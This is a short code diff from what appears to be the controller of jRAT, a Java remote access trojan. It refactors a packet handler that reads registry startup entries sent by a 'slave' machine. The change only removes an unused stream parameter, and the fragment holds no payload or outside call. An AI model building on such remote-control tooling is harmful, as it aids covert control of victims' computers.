@@ -4,13 +4,11 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlRegStart;
 
-import java.io.DataInputStream;
-
 
 public class Packet53RegistryStartup extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		int count = slave.readInt();
 		String[] args = new String[count];
 		for (int i = 0; i < count; i++) {
